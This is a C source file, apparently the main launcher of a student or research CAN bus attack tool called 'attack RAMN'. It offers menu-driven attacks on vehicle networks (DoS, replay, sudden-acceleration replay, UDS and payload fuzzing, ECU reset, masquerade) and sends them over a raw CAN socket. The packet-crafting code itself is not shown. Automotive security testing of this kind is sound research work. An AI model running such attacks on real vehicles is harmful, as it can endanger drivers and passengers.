#include "all_headers.h"

/*================================================================
main.c
This program is a CAN packet sender with various attack codes.

Parameters:
- interface: CAN interface name
- attack_code: attack code
- canid: CAN ID (in hexadecimal)
- time_diff: time difference between packets (in ms)
==================================================================*/

char interface[IFNAMSIZ];
int attack_code;
int canid;
int time_diff;
pid_t child_pid;

void clear_read_buffer() {
    while(getchar()!='\n');
}

void handle_sigint(int sig) {
    if (child_pid > 0) {
        kill(child_pid, SIGTERM);
        waitpid(child_pid, NULL, 0);
        printf("\nRestarting main fuction...\n");
        main();
    } else {
        exit(0);
    }
}

#include <stdio.h> // 함수 외부로 이동

void startpage() {
    // yellow txt
    printf("\033[33m");
    printf("        _    _                 _    \n");
    printf("       | |  | |               | |   \n");
    printf("  __ _ | |_ | |_   __ _   ___ | | __\n");
    printf(" / _` || __|| __| / _` | / __|| |/ /\n");
    printf("| (_| || |_ | |_ | (_| || (__ |   < \n");
    printf(" \\__,_| \\__| \\__| \\__,_| \\___||_|\\_\\\n");
    printf(".______           ___      .___  ___. .__   __. \n");
    printf("|   _  \\         /   \\     |   \\/   | |  \\ |  | \n");
    printf("|  |_)  |       /  ^  \\    |  \\  /  | |   \\|  | \n");
    printf("|      /       /  /_\\  \\   |  |\\/|  | |  . `  | \n");
    printf("|  |\\  \\----. /  _____  \\  |  |  |  | |  |\\   | \n");
    printf("| _| `._____|/__/     \\__\\ |__|  |__| |__| \\__|. ver_1.1\n");
    printf("                                               team.YESICAN\n");
    //style reset
    printf("\033[0m");
    
    // blue bg, red txt
    printf("\033[1;31m");
    printf("press 'ctrl+Z' to exit program\npress 'ctrl+C' to go main menu while attack\n");
    // style reset
    printf("\033[0m");
}


void print_get_attack_codes(void) {
    printf("=====================attack  codes======================\n");
    printf("(1): dos_dos                (5): fuzzing_random_canid\n");
    printf("(2): replay_replay          (6): fuzzing_random_payload\n");
    printf("(3): replay_suddenaccel     (7): suspension_resetecu\n");
    printf("(4): fuzzing_find_uds       (8): msq_msq[masquerade]\n");
    printf("========================================================\n\n");
    printf("## Enter attack code you want: ");
}

void get_attack_variables() {
    print_get_attack_codes();
    scanf("%d", &attack_code);
    if (attack_code < 1 || attack_code > 8) {
        printf("\nInvalid attack code. Please try again.\n\n");
        get_attack_variables();
    }

    printf("## Enter CAN interface name [e.g.:vcan0]: ");
    scanf("%s", interface);

    printf("## Enter CAN ID (in hexadecimal, [e.g.:0x100]): ");
    scanf("%x", &canid);
    if (canid < 0x000 || canid > 0xfff) {
        printf("\nInvalid CAN ID. Please try again.\n\n");
        get_attack_variables();
    }

    printf("## Enter time difference (in ms), [enter 0 to send once]: ");
    scanf("%d", &time_diff);
    if ((time_diff < 0) || (time_diff > 100000)) {
        printf("\nInvalid time difference. Please try again.\n\n");
        get_attack_variables();
    }
}

int main() {
    signal(SIGINT, handle_sigint);

    startpage();

    //get user input
    get_attack_variables();
    clear_read_buffer();

    //socket create
    int s = socket(PF_CAN, SOCK_RAW, CAN_RAW);
    if (s < 0) {
        perror("Socket creation error");
        return 1;
    }

    struct ifreq ifr;
    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
    if (ioctl(s, SIOCGIFINDEX, &ifr) < 0) {
        perror("SIOCGIFINDEX error");
        close(s);
        return 1;
    }

    struct sockaddr_can addr = {0};
    addr.can_family = AF_CAN;
    addr.can_ifindex = ifr.ifr_ifindex;
    if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("Socket binding error");
        close(s);
        return 1;
    }

    child_pid = fork();
    if (child_pid == 0) {
        attack_packet_sender(s, &addr, attack_code, canid, time_diff);
        close(s);
        exit(0);
    } else if (child_pid < 0) {
        perror("Fork error");
        close(s);
        return 1;
    }

    wait (NULL);
    
    //close the socket
    close(s);
    return 0;
}
